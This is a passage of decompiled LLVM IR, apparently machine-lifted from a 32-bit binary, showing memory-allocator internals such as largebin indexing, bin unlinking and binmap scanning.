  store i32 %v3_8053f1f, i32* %eax.global-to-local, align 4
  store i32 %v3_8053f1f, i32* %v2_8053f18, align 4
  br label %dec_label_pc_8053f60

dec_label_pc_8053f27:                             ; preds = %dec_label_pc_8053f0c, %dec_label_pc_8053f06
  %v8_8053f27 = icmp ult i32 %v1_805427e, 255
  %v6_8053f2f = icmp ugt i32 %v1_805427e, 255
  store i32 %v1_805427e, i32* @eax, align 4
  br i1 %v6_8053f2f, label %dec_label_pc_8053f68, label %dec_label_pc_8053f31

dec_label_pc_8053f31:                             ; preds = %dec_label_pc_8053f27
  %v2_8053f35 = udiv i32 %v1_805427e, 8
  store i32 %v2_8053f35, i32* %eax.global-to-local, align 4
  %v1_8053f38 = mul nuw i32 %v2_8053f35, 8
  %v2_8053f38 = add i32 %v1_8053f38, ptrtoint (i32* @global_var_806582c.959 to i32)
  store i32 %v2_8053f38, i32* @ecx, align 4
  %v1_8053f43 = add i32 %v1_8053f38, add (i32 ptrtoint (i32* @global_var_806582c.959 to i32), i32 12)
  %v2_8053f43 = inttoptr i32 %v1_8053f43 to i32*
  %v3_8053f43 = load i32, i32* %v2_8053f43, align 4
  store i32 %v3_8053f43, i32* @edx, align 4
  %v12_8053f46 = icmp eq i32 %v3_8053f43, %v2_8053f38
  br i1 %v12_8053f46, label %dec_label_pc_8054064.preheader, label %dec_label_pc_8053f4e

dec_label_pc_8053f4e:                             ; preds = %dec_label_pc_8053f31
  store i32 %v1_805427e, i32* %ebx.global-to-local, align 4
  %v1_8053f52 = add i32 %v3_8053f43, 12
  %v2_8053f52 = inttoptr i32 %v1_8053f52 to i32*
  %v3_8053f52 = load i32, i32* %v2_8053f52, align 4
  store i32 %v3_8053f52, i32* %eax.global-to-local, align 4
  %v2_8053f55 = or i32 %v1_805427e, 4
  %v3_8053f55 = add i32 %v3_8053f43, %v2_8053f55
  %v4_8053f55 = inttoptr i32 %v3_8053f55 to i32*
  %v5_8053f55 = load i32, i32* %v4_8053f55, align 4
  %v6_8053f55 = or i32 %v5_8053f55, 1
  store i32 %v6_8053f55, i32* %v4_8053f55, align 4
  %v0_8053f5a = load i32, i32* %eax.global-to-local, align 4
  %v1_8053f5a = load i32, i32* @ecx, align 4
  %v2_8053f5a = add i32 %v1_8053f5a, 12
  %v3_8053f5a = inttoptr i32 %v2_8053f5a to i32*
  store i32 %v0_8053f5a, i32* %v3_8053f5a, align 4
  %v0_8053f5d = load i32, i32* @ecx, align 4
  %v1_8053f5d = load i32, i32* %eax.global-to-local, align 4
  %v2_8053f5d = add i32 %v1_8053f5d, 8
  %v3_8053f5d = inttoptr i32 %v2_8053f5d to i32*
  store i32 %v0_8053f5d, i32* %v3_8053f5d, align 4
  br label %dec_label_pc_8053f60

dec_label_pc_8053f60:                             ; preds = %dec_label_pc_8053f1f, %dec_label_pc_8053f4e
  %v0_8053f60 = load i32, i32* @edx, align 4
  %v1_8053f60 = add i32 %v0_8053f60, 8
  store i32 %v1_8053f60, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054609

dec_label_pc_8053f68:                             ; preds = %dec_label_pc_8053f27
  %v0_8053f6c = call i32 @__malloc_largebin_index()
  store i32 %v0_8053f6c, i32* %eax.global-to-local, align 4
  %v3_8053f71 = and i8 %v0_8053ede, 2
  %v4_8053f71 = icmp eq i8 %v3_8053f71, 0
  br i1 %v4_8053f71, label %dec_label_pc_8054064.preheader, label %dec_label_pc_8053f7e

dec_label_pc_8053f7e:                             ; preds = %dec_label_pc_8053f68
  store i32 ptrtoint (i8* @global_var_8065800.958 to i32), i32* %stack_var_-92, align 4
  %v2_8053f86 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8065800.958 to i32*))
  store i32 %v2_8053f86, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054064.preheader

dec_label_pc_8054064.preheader:                   ; preds = %dec_label_pc_8053f7e, %dec_label_pc_8053f31, %dec_label_pc_8053f68
  %stack_var_-40.0.ph = phi i32 [ %v2_8053f35, %dec_label_pc_8053f31 ], [ %v0_8053f6c, %dec_label_pc_8053f7e ], [ %v0_8053f6c, %dec_label_pc_8053f68 ]
  %v1_8053fba = add i32 %v1_805427e, 16
  %v0_8054064109 = load i32, i32* @global_var_8065840.962, align 64
  store i32 %v0_8054064109, i32* @ebp, align 4
  %v9_805406a115 = icmp eq i32 %v0_8054064109, 134633524
  %v1_8054070117 = icmp eq i1 %v9_805406a115, false
  br i1 %v1_8054070117, label %dec_label_pc_8053f93, label %dec_label_pc_8054076

dec_label_pc_8053f93:                             ; preds = %dec_label_pc_8054064.preheader, %bb82
  %v0_8054064118 = phi i32 [ %v0_8054064, %bb82 ], [ %v0_8054064109, %dec_label_pc_8054064.preheader ]
  %v1_8053f93 = add i32 %v0_8054064118, 4
  %v2_8053f93 = inttoptr i32 %v1_8053f93 to i32*
  %v3_8053f93 = load i32, i32* %v2_8053f93, align 4
  %v1_8053f96 = add i32 %v0_8054064118, 12
  %v2_8053f96 = inttoptr i32 %v1_8053f96 to i32*
  %v3_8053f96 = load i32, i32* %v2_8053f96, align 4
  store i32 %v3_8053f96, i32* @edx, align 4
  %v1_8053f99 = and i32 %v3_8053f93, -4
  store i32 %v1_8053f99, i32* @edi, align 4
  br i1 %v6_8053f2f, label %dec_label_pc_8053fc5, label %dec_label_pc_8053fa6

dec_label_pc_8053fa6:                             ; preds = %dec_label_pc_8053f93
  %v9_8053fa6 = icmp eq i32 %v3_8053f96, 134633524
  %v1_8053fac = icmp eq i1 %v9_8053fa6, false
  br i1 %v1_8053fac, label %dec_label_pc_8053fc5, label %dec_label_pc_8053fae

dec_label_pc_8053fae:                             ; preds = %dec_label_pc_8053fa6
  %v1_8053fae = load i32, i32* @global_var_8065830.960, align 16
  %v12_8053fae = icmp eq i32 %v0_8054064118, %v1_8053fae
  %v1_8053fb4 = icmp eq i1 %v12_8053fae, false
  br i1 %v1_8053fb4, label %dec_label_pc_8053fc5, label %dec_label_pc_8053fb6

dec_label_pc_8053fb6:                             ; preds = %dec_label_pc_8053fae
  store i32 %v1_8053fba, i32* %eax.global-to-local, align 4
  %v6_8053fbf = icmp ugt i32 %v1_8053f99, %v1_8053fba
  br i1 %v6_8053fbf, label %dec_label_pc_80545a4, label %dec_label_pc_8053fc5

dec_label_pc_8053fc5:                             ; preds = %dec_label_pc_8053fb6, %dec_label_pc_8053fae, %dec_label_pc_8053fa6, %dec_label_pc_8053f93
  store i32 ptrtoint (i32* @global_var_8065834.961 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_8053f96, i32* @global_var_8065840.962, align 4
  %v2_8053fcd = add i32 %v3_8053f96, 8
  %v3_8053fcd = inttoptr i32 %v2_8053fcd to i32*
  store i32 ptrtoint (i32* @global_var_8065834.961 to i32), i32* %v3_8053fcd, align 4
  %v0_8053fd0 = load i32, i32* @edi, align 4
  %v15_8053fd0 = icmp eq i32 %v0_8053fd0, %v1_805427e
  br i1 %v15_8053fd0, label %dec_label_pc_80545e5, label %dec_label_pc_8053fda

dec_label_pc_8053fda:                             ; preds = %dec_label_pc_8053fc5
  %v6_8053fe0 = icmp ugt i32 %v0_8053fd0, 255
  br i1 %v6_8053fe0, label %dec_label_pc_8053ff3, label %dec_label_pc_8053fe2

dec_label_pc_8053fe2:                             ; preds = %dec_label_pc_8053fda
  %v2_8053fe4 = udiv i32 %v0_8053fd0, 8
  store i32 %v2_8053fe4, i32* %esi.global-to-local, align 4
  %v1_8053fe7 = mul nuw i32 %v2_8053fe4, 8
  %v2_8053fe7 = add i32 %v1_8053fe7, 134633516
  store i32 %v2_8053fe7, i32* @ebx, align 4
  %v1_8053fee = add i32 %v1_8053fe7, 134633524
  %v2_8053fee = inttoptr i32 %v1_8053fee to i32*
  %v3_8053fee = load i32, i32* %v2_8053fee, align 4
  store i32 %v3_8053fee, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805403c

dec_label_pc_8053ff3:                             ; preds = %dec_label_pc_8053fda
  store i32 %v0_8053fd0, i32* @eax, align 4
  %v0_8053ff5 = call i32 @__malloc_largebin_index()
  store i32 %v0_8053ff5, i32* %esi.global-to-local, align 4
  %v1_8053ffc = mul i32 %v0_8053ff5, 8
  %v2_8053ffc = add i32 %v1_8053ffc, ptrtoint (i32* @global_var_806582c.959 to i32)
  store i32 %v2_8053ffc, i32* %eax.global-to-local, align 4
  %v1_8054003 = add i32 %v1_8053ffc, add (i32 ptrtoint (i32* @global_var_806582c.959 to i32), i32 8)
  %v2_8054003 = inttoptr i32 %v1_8054003 to i32*
  %v3_8054003 = load i32, i32* %v2_8054003, align 4
  store i32 %v3_8054003, i32* %edx.global-to-local, align 4
  %v12_8054006 = icmp eq i32 %v3_8054003, %v2_8053ffc
  store i32 %v3_8054003, i32* @ebx, align 4
  br i1 %v12_8054006, label %dec_label_pc_805403c, label %dec_label_pc_8054010

dec_label_pc_8054010:                             ; preds = %dec_label_pc_8053ff3
  %v1_8054010 = add i32 %v1_8053ffc, add (i32 ptrtoint (i32* @global_var_806582c.959 to i32), i32 12)
  %v2_8054010 = inttoptr i32 %v1_8054010 to i32*
  %v3_8054010 = load i32, i32* %v2_8054010, align 4
  store i32 %v3_8054010, i32* @ebx, align 4
  %v0_8054013 = load i32, i32* @edi, align 4
  %v2_8054013 = add i32 %v3_8054010, 4
  %v3_8054013 = inttoptr i32 %v2_8054013 to i32*
  %v4_8054013 = load i32, i32* %v3_8054013, align 4
  %v10_8054013 = icmp ult i32 %v0_8054013, %v4_8054013
  %v1_8054016 = icmp eq i1 %v10_8054013, false
  br i1 %v1_8054016, label %dec_label_pc_805401e, label %dec_label_pc_805403c

dec_label_pc_805401e:                             ; preds = %dec_label_pc_8054010
  %v1_8054020 = or i32 %v0_8054013, 1
  store i32 %v1_8054020, i32* %eax.global-to-local, align 4
  store i32 %v3_8054003, i32* %ebx.global-to-local, align 4
  %v2_8054034101 = add i32 %v3_8054003, 4
  %v3_8054034102 = inttoptr i32 %v2_8054034101 to i32*
  %v4_8054034103 = load i32, i32* %v3_8054034102, align 4
  %v10_8054034105 = icmp ult i32 %v1_8054020, %v4_8054034103
  br i1 %v10_8054034105, label %dec_label_pc_8054025, label %dec_label_pc_8054039

dec_label_pc_8054025:                             ; preds = %dec_label_pc_805401e, %dec_label_pc_8054025
  %v0_8054039106 = phi i32 [ %v3_8054029, %dec_label_pc_8054025 ], [ %v3_8054003, %dec_label_pc_805401e ]
  store i32 %v0_8054039106, i32* %ecx.global-to-local, align 4
  %v1_8054029 = add i32 %v0_8054039106, 8
  %v2_8054029 = inttoptr i32 %v1_8054029 to i32*
  %v3_8054029 = load i32, i32* %v2_8054029, align 4
  store i32 %v3_8054029, i32* %ecx.global-to-local, align 4
  store i32 %v3_8054029, i32* %ebx.global-to-local, align 4
  %v2_8054034 = add i32 %v3_8054029, 4
  %v3_8054034 = inttoptr i32 %v2_8054034 to i32*
  %v4_8054034 = load i32, i32* %v3_8054034, align 4
  %v10_8054034 = icmp ult i32 %v1_8054020, %v4_8054034
  br i1 %v10_8054034, label %dec_label_pc_8054025, label %dec_label_pc_8054039

dec_label_pc_8054039:                             ; preds = %dec_label_pc_8054025, %dec_label_pc_805401e
  %v0_8054039.lcssa = phi i32 [ %v3_8054003, %dec_label_pc_805401e ], [ %v3_8054029, %dec_label_pc_8054025 ]
  %v1_8054039 = add i32 %v0_8054039.lcssa, 12
  %v2_8054039 = inttoptr i32 %v1_8054039 to i32*
  %v3_8054039 = load i32, i32* %v2_8054039, align 4
  store i32 %v3_8054039, i32* @ebx, align 4
  br label %dec_label_pc_805403c

dec_label_pc_805403c:                             ; preds = %dec_label_pc_8053fe2, %dec_label_pc_8054010, %dec_label_pc_8053ff3, %dec_label_pc_8054039
  %v0_805403c = phi i32 [ %v0_8053ff5, %dec_label_pc_8053ff3 ], [ %v0_8053ff5, %dec_label_pc_8054039 ], [ %v0_8053ff5, %dec_label_pc_8054010 ], [ %v2_8053fe4, %dec_label_pc_8053fe2 ]
  %stack_var_-64.1 = phi i32 [ %v3_8054003, %dec_label_pc_8053ff3 ], [ %v0_8054039.lcssa, %dec_label_pc_8054039 ], [ %v2_8053ffc, %dec_label_pc_8054010 ], [ %v3_8053fee, %dec_label_pc_8053fe2 ]
  %v1_805403e = urem i32 %v0_805403c, 32
  %v2_805403e = icmp eq i32 %v1_805403e, 0
  store i32 %v1_805403e, i32* %esi.global-to-local, align 4
  store i32 %v1_805403e, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8054048 = sdiv i32 %v0_805403c, 32
  store i32 %v2_8054048, i32* %edx.global-to-local, align 4
  br i1 %v2_805403e, label %bb82, label %bb

bb:                                               ; preds = %dec_label_pc_805403c
  %v5_805404b = shl i32 1, %v1_805403e
  store i32 %v5_805404b, i32* %eax.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_805403c, %bb
  %v5_805404d = phi i32 [ 1, %dec_label_pc_805403c ], [ %v5_805404b, %bb ]
  %v1_805404d = mul nsw i32 %v2_8054048, 4
  %v2_805404d = add i32 %v1_805404d, ptrtoint (i32* @global_var_8065b34.963 to i32)
  %v3_805404d = inttoptr i32 %v2_805404d to i32*
  %v4_805404d = load i32, i32* %v3_805404d, align 4
  %v6_805404d = or i32 %v4_805404d, %v5_805404d
  store i32 %v6_805404d, i32* %v3_805404d, align 4
  %v0_8054054 = load i32, i32* @ebx, align 4
  %v1_8054054 = load i32, i32* @ebp, align 4
  %v2_8054054 = add i32 %v1_8054054, 12
  %v3_8054054 = inttoptr i32 %v2_8054054 to i32*
  store i32 %v0_8054054, i32* %v3_8054054, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_805405b = load i32, i32* @ebp, align 4
  %v2_805405b = add i32 %v1_805405b, 8
  %v3_805405b = inttoptr i32 %v2_805405b to i32*
  store i32 %stack_var_-64.1, i32* %v3_805405b, align 4
  %v0_805405e = load i32, i32* @ebp, align 4
  %v1_805405e = load i32, i32* @esi, align 4
  %v2_805405e = add i32 %v1_805405e, 12
  %v3_805405e = inttoptr i32 %v2_805405e to i32*
  store i32 %v0_805405e, i32* %v3_805405e, align 4
  %v0_8054061 = load i32, i32* @ebp, align 4
  %v1_8054061 = load i32, i32* @ebx, align 4
  %v2_8054061 = add i32 %v1_8054061, 8
  %v3_8054061 = inttoptr i32 %v2_8054061 to i32*
  store i32 %v0_8054061, i32* %v3_8054061, align 4
  %v0_8054064 = load i32, i32* @global_var_8065840.962, align 64
  store i32 %v0_8054064, i32* @ebp, align 4
  %v9_805406a = icmp eq i32 %v0_8054064, 134633524
  %v1_8054070 = icmp eq i1 %v9_805406a, false
  br i1 %v1_8054070, label %dec_label_pc_8053f93, label %dec_label_pc_8054076

dec_label_pc_8054076:                             ; preds = %bb82, %dec_label_pc_8054064.preheader
  br i1 %v8_8053f27, label %dec_label_pc_8054104, label %dec_label_pc_8054084

dec_label_pc_8054084:                             ; preds = %dec_label_pc_8054076
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8054088 = mul i32 %stack_var_-40.0.ph, 8
  %v2_8054088 = add i32 %v1_8054088, ptrtoint (i32* @global_var_806582c.959 to i32)
  store i32 %v2_8054088, i32* %edx.global-to-local, align 4
  %v1_805408f = add i32 %v1_8054088, add (i32 ptrtoint (i32* @global_var_806582c.959 to i32), i32 12)
  %v2_805408f = inttoptr i32 %v1_805408f to i32*
  %storemerge1.pre = load i32, i32* %v2_805408f, align 4
  br label %dec_label_pc_8054100

dec_label_pc_8054094:                             ; preds = %dec_label_pc_8054100
  %v1_8054094 = add i32 %v4_80540ab, 4
  %v2_8054094 = inttoptr i32 %v1_8054094 to i32*
  %v3_8054094 = load i32, i32* %v2_8054094, align 4
  store i32 %v3_8054094, i32* %ebx.global-to-local, align 4
  %v1_8054097 = add i32 %v4_80540ab, 12
  %v2_8054097 = inttoptr i32 %v1_8054097 to i32*
  %v3_8054097 = load i32, i32* %v2_8054097, align 4
  store i32 %v3_8054097, i32* @ecx, align 4
  %v1_805409a = and i32 %v3_8054094, -4
  store i32 %v1_805409a, i32* @ebx, align 4
  %v10_805409d = icmp ult i32 %v1_805409a, %v1_805427e
  br i1 %v10_805409d, label %dec_label_pc_8054100, label %dec_label_pc_80540a3

dec_label_pc_80540a3:                             ; preds = %dec_label_pc_8054094
  %v1_80540a3 = add i32 %v4_80540ab, 8
  %v2_80540a3 = inttoptr i32 %v1_80540a3 to i32*
  %v3_80540a3 = load i32, i32* %v2_80540a3, align 4
  store i32 %v3_80540a3, i32* @edx, align 4
  %v1_80540a6 = add i32 %v3_80540a3, 12
  %v2_80540a6 = inttoptr i32 %v1_80540a6 to i32*
  %v3_80540a6 = load i32, i32* %v2_80540a6, align 4
  %v15_80540a6 = icmp eq i32 %v3_80540a6, %v4_80540ab
  %v1_80540a9 = icmp eq i1 %v15_80540a6, false
  br i1 %v1_80540a9, label %dec_label_pc_80540b0, label %dec_label_pc_80540ab

dec_label_pc_80540ab:                             ; preds = %dec_label_pc_80540a3
  %v1_80540ab = add i32 %v3_8054097, 8
  %v2_80540ab = inttoptr i32 %v1_80540ab to i32*
  %v3_80540ab = load i32, i32* %v2_80540ab, align 4
  %v15_80540ab = icmp eq i32 %v3_80540ab, %v4_80540ab
  br i1 %v15_80540ab, label %dec_label_pc_80540b5, label %dec_label_pc_80540b0

dec_label_pc_80540b0:                             ; preds = %dec_label_pc_80540ab, %dec_label_pc_80540a3
  %v0_80540b0 = call i32 @abort()
  store i32 %v0_80540b0, i32* %eax.global-to-local, align 4
  %v0_80540b5.pre = load i32, i32* @ebx, align 4
  %v0_80540bb.pre = load i32, i32* @ecx, align 4
  %v1_80540bb.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80540b5

dec_label_pc_80540b5:                             ; preds = %dec_label_pc_80540ab, %dec_label_pc_80540b0
  %v1_80540bb = phi i32 [ %v3_80540a3, %dec_label_pc_80540ab ], [ %v1_80540bb.pre, %dec_label_pc_80540b0 ]
  %v0_80540bb = phi i32 [ %v3_8054097, %dec_label_pc_80540ab ], [ %v0_80540bb.pre, %dec_label_pc_80540b0 ]
  %v0_80540b5 = phi i32 [ %v1_805409a, %dec_label_pc_80540ab ], [ %v0_80540b5.pre, %dec_label_pc_80540b0 ]
  %v5_80540b7 = sub i32 %v0_80540b5, %v1_805427e
  store i32 %v5_80540b7, i32* %esi.global-to-local, align 4
  %v2_80540bb = add i32 %v1_80540bb, 12
  %v3_80540bb = inttoptr i32 %v2_80540bb to i32*
  store i32 %v0_80540bb, i32* %v3_80540bb, align 4
  %v0_80540be = load i32, i32* @edx, align 4
  %v1_80540be = load i32, i32* @ecx, align 4
  %v2_80540be = add i32 %v1_80540be, 8
  %v3_80540be = inttoptr i32 %v2_80540be to i32*
  store i32 %v0_80540be, i32* %v3_80540be, align 4
  %v0_80540c1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80540c1 = add i32 %v0_80540c1, 8
  store i32 %v1_80540c1, i32* @ecx, align 4
  %v0_80540c4 = load i32, i32* %esi.global-to-local, align 4
  %tmp137 = icmp ult i32 %v0_80540c4, 16
  br i1 %tmp137, label %dec_label_pc_80545f3, label %dec_label_pc_80540cd

dec_label_pc_80540cd:                             ; preds = %dec_label_pc_80540b5
  %v2_80540d1 = add i32 %v0_80540c1, %v1_805427e
  store i32 %v2_80540d1, i32* @edx, align 4
  %v1_80540d4 = or i32 %v1_805427e, 1
  store i32 %v1_80540d4, i32* %ebx.global-to-local, align 4
  %v2_80540d7 = add i32 %v0_80540c1, 4
  %v3_80540d7 = inttoptr i32 %v2_80540d7 to i32*
  store i32 %v1_80540d4, i32* %v3_80540d7, align 4
  %v0_80540da = load i32, i32* %esi.global-to-local, align 4
  %v1_80540dc = or i32 %v0_80540da, 1
  store i32 %v1_80540dc, i32* %eax.global-to-local, align 4
  %v0_80540df = load i32, i32* @edx, align 4
  %v1_80540df = load i32, i32* @ebp, align 4
  %v2_80540df = add i32 %v1_80540df, 8
  %v3_80540df = inttoptr i32 %v2_80540df to i32*
  store i32 %v0_80540df, i32* %v3_80540df, align 4
  %v0_80540e2 = load i32, i32* @edx, align 4
  %v1_80540e2 = load i32, i32* @ebp, align 4
  %v2_80540e2 = add i32 %v1_80540e2, 12
  %v3_80540e2 = inttoptr i32 %v2_80540e2 to i32*
  store i32 %v0_80540e2, i32* %v3_80540e2, align 4
  %v0_80540e5 = load i32, i32* @edx, align 4
  %v1_80540e5 = add i32 %v0_80540e5, 8
  %v2_80540e5 = inttoptr i32 %v1_80540e5 to i32*
  store i32 ptrtoint (i32* @global_var_8065834.961 to i32), i32* %v2_80540e5, align 4
  %v0_80540ec = load i32, i32* @edx, align 4
  %v1_80540ec = add i32 %v0_80540ec, 12
  %v2_80540ec = inttoptr i32 %v1_80540ec to i32*
  store i32 ptrtoint (i32* @global_var_8065834.961 to i32), i32* %v2_80540ec, align 4
  %v0_80540f3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80540f3 = load i32, i32* @edx, align 4
  %v2_80540f3 = add i32 %v1_80540f3, 4
  %v3_80540f3 = inttoptr i32 %v2_80540f3 to i32*
  store i32 %v0_80540f3, i32* %v3_80540f3, align 4
  %v0_80540f6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80540f6 = load i32, i32* @edx, align 4
  %v3_80540f6 = add i32 %v1_80540f6, %v0_80540f6
  %v4_80540f6 = inttoptr i32 %v3_80540f6 to i32*
  store i32 %v0_80540f6, i32* %v4_80540f6, align 4
  br label %dec_label_pc_80545f8

dec_label_pc_8054100:                             ; preds = %dec_label_pc_8054094, %dec_label_pc_8054084
  %v4_80540ab = phi i32 [ %storemerge1.pre, %dec_label_pc_8054084 ], [ %v3_8054097, %dec_label_pc_8054094 ]
  store i32 %v4_80540ab, i32* %eax.global-to-local, align 4
  %v12_8054100 = icmp eq i32 %v4_80540ab, %v2_8054088
  %v1_8054102 = icmp eq i1 %v12_8054100, false
  br i1 %v1_8054102, label %dec_label_pc_8054094, label %dec_label_pc_8054104.loopexit

dec_label_pc_8054104.loopexit:                    ; preds = %dec_label_pc_8054100
  br label %dec_label_pc_8054104

dec_label_pc_8054104:                             ; preds = %dec_label_pc_8054104.loopexit, %dec_label_pc_8054076
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_805410d = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_805410d, i32* %ecx.global-to-local, align 4
  %v2_8054110 = udiv i32 %v1_805410d, 32
  store i32 %v2_8054110, i32* @edi, align 4
  %v1_8054113 = mul nuw nsw i32 %v2_8054110, 4
  %v2_8054113 = add i32 %v1_8054113, ptrtoint (i32* @global_var_8065b34.963 to i32)
  %v3_8054113 = inttoptr i32 %v2_8054113 to i32*
  %v4_8054113 = load i32, i32* %v3_8054113, align 4
  store i32 %v4_8054113, i32* %edx.global-to-local, align 4
  %v1_805411a = mul i32 %v1_805410d, 8
  %v2_805411a = add i32 %v1_805411a, ptrtoint (i32* @global_var_806582c.959 to i32)
  store i32 %v2_805411a, i32* %ebx.global-to-local, align 4
  %v1_8054121 = urem i32 %v1_805410d, 32
  %v2_8054121 = icmp eq i32 %v1_8054121, 0
  store i32 %v1_8054121, i32* %ecx.global-to-local, align 4
  br i1 %v2_8054121, label %.preheader, label %bb83

bb83:                                             ; preds = %dec_label_pc_8054104
  %v5_8054124 = shl i32 1, %v1_8054121
  store i32 %v5_8054124, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8054104, %bb83, %dec_label_pc_8054165
  %v1_8054126 = phi i32 [ %v1_8054126.pre, %dec_label_pc_8054165 ], [ %v4_8054113, %bb83 ], [ %v4_8054113, %dec_label_pc_8054104 ]
  %v0_805412a = phi i32 [ %v0_8054126.pre, %dec_label_pc_8054165 ], [ %v5_8054124, %bb83 ], [ 1, %dec_label_pc_8054104 ]
  %tmp84 = icmp ule i32 %v0_805412a, %v1_8054126
  %v1_805412a = icmp eq i32 %v0_805412a, 0
  %v1_805412c = icmp eq i1 %v1_805412a, false
  %or.cond = and i1 %tmp84, %v1_805412c
  br i1 %or.cond, label %dec_label_pc_805412a.dec_label_pc_805415a.preheader_crit_edge, label %dec_label_pc_805412e.preheader

dec_label_pc_805412a.dec_label_pc_805415a.preheader_crit_edge: ; preds = %.preheader
  %v0_805415512.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805415a.preheader

dec_label_pc_805412e.preheader:                   ; preds = %.preheader
  %v0_805412e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805412e

dec_label_pc_805412e:                             ; preds = %dec_label_pc_805412e.preheader, %dec_label_pc_8054138
  %v0_805412e = phi i32 [ %v0_805412e.pre, %dec_label_pc_805412e.preheader ], [ %v1_805412e, %dec_label_pc_8054138 ]
  %v1_805412e = add i32 %v0_805412e, 1
  store i32 %v1_805412e, i32* @edi, align 4
  %v6_8054132 = icmp ugt i32 %v1_805412e, 2
  br i1 %v6_8054132, label %dec_label_pc_80541e9.loopexit, label %dec_label_pc_8054138

dec_label_pc_8054138:                             ; preds = %dec_label_pc_805412e
  %v1_8054138 = mul i32 %v1_805412e, 4
  %v2_8054138 = add i32 %v1_8054138, ptrtoint (i32* @global_var_8065b34.963 to i32)
  %v3_8054138 = inttoptr i32 %v2_8054138 to i32*
  %v4_8054138 = load i32, i32* %v3_8054138, align 4
  store i32 %v4_8054138, i32* %edx.global-to-local, align 4
  %v1_805413f = icmp eq i32 %v4_8054138, 0
  br i1 %v1_805413f, label %dec_label_pc_805412e, label %dec_label_pc_8054143

dec_label_pc_8054143:                             ; preds = %dec_label_pc_8054138
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_805414a = mul i32 %v1_805412e, 256
  store i32 %v2_805414a, i32* %eax.global-to-local, align 4
  %v1_805414d = add i32 %v2_805414a, ptrtoint (i32* @global_var_806582c.959 to i32)
  store i32 %v1_805414d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805415a.preheader

dec_label_pc_805415a.preheader:                   ; preds = %dec_label_pc_805412a.dec_label_pc_805415a.preheader_crit_edge, %dec_label_pc_8054143
  %v0_805415512 = phi i32 [ %v1_805414d, %dec_label_pc_8054143 ], [ %v0_805415512.pre, %dec_label_pc_805412a.dec_label_pc_805415a.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_8054143 ], [ %v0_805412a, %dec_label_pc_805412a.dec_label_pc_805415a.preheader_crit_edge ]
  %v0_805416b = phi i32 [ %v4_8054138, %dec_label_pc_8054143 ], [ %v1_8054126, %dec_label_pc_805412a.dec_label_pc_805415a.preheader_crit_edge ]
  %v2_805415a4 = and i32 %v0_805416b, %esi.promoted
  %v3_805415a5 = icmp eq i32 %v2_805415a4, 0
  br i1 %v3_805415a5, label %dec_label_pc_8054155, label %dec_label_pc_805415e

dec_label_pc_8054155:                             ; preds = %dec_label_pc_805415a.preheader, %dec_label_pc_8054155
  %v2_805415814 = phi i32 [ %v2_8054158, %dec_label_pc_8054155 ], [ %esi.promoted, %dec_label_pc_805415a.preheader ]
  %v0_805415513 = phi i32 [ %v1_8054155, %dec_label_pc_8054155 ], [ %v0_805415512, %dec_label_pc_805415a.preheader ]
  %v1_8054155 = add i32 %v0_805415513, 8
  %v2_8054158 = mul i32 %v2_805415814, 2
  %v2_805415a = and i32 %v2_8054158, %v0_805416b
  %v3_805415a = icmp eq i32 %v2_805415a, 0
  br i1 %v3_805415a, label %dec_label_pc_8054155, label %dec_label_pc_805415a.dec_label_pc_805415e_crit_edge

dec_label_pc_805415a.dec_label_pc_805415e_crit_edge: ; preds = %dec_label_pc_8054155
  store i32 %v1_8054155, i32* %ebx.global-to-local, align 4
  store i32 %v2_8054158, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805415e

dec_label_pc_805415e:                             ; preds = %dec_label_pc_805415a.dec_label_pc_805415e_crit_edge, %dec_label_pc_805415a.preheader
  %v0_8054165 = phi i32 [ %v2_8054158, %dec_label_pc_805415a.dec_label_pc_805415e_crit_edge ], [ %esi.promoted, %dec_label_pc_805415a.preheader ]
  %v1_8054188 = phi i32 [ %v1_8054155, %dec_label_pc_805415a.dec_label_pc_805415e_crit_edge ], [ %v0_805415512, %dec_label_pc_805415a.preheader ]
  %v1_805415e = add i32 %v1_8054188, 12
  %v2_805415e = inttoptr i32 %v1_805415e to i32*
  %v3_805415e = load i32, i32* %v2_805415e, align 4
  store i32 %v3_805415e, i32* @ecx, align 4
  %v12_8054161 = icmp eq i32 %v3_805415e, %v1_8054188
  %v1_8054163 = icmp eq i1 %v12_8054161, false
  br i1 %v1_8054163, label %dec_label_pc_8054179, label %dec_label_pc_8054165

dec_label_pc_8054165:                             ; preds = %dec_label_pc_805415e
  %v2_8054167 = mul i32 %v0_8054165, 2
  store i32 %v2_8054167, i32* %esi.global-to-local, align 4
  %v1_8054169 = sub i32 -1, %v0_8054165
  store i32 %v1_8054169, i32* %eax.global-to-local, align 4
  %v2_805416b = and i32 %v0_805416b, %v1_8054169
  store i32 %v2_805416b, i32* %edx.global-to-local, align 4
  %v1_805416d = add i32 %v3_805415e, 8
  store i32 %v1_805416d, i32* %ebx.global-to-local, align 4
  %v1_8054170 = load i32, i32* @edi, align 4
  %v2_8054170 = mul i32 %v1_8054170, 4
  %v3_8054170 = add i32 %v2_8054170, ptrtoint (i32* @global_var_8065b34.963 to i32)
  %v4_8054170 = inttoptr i32 %v3_8054170 to i32*
  store i32 %v2_805416b, i32* %v4_8054170, align 4
  %v0_8054126.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8054126.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

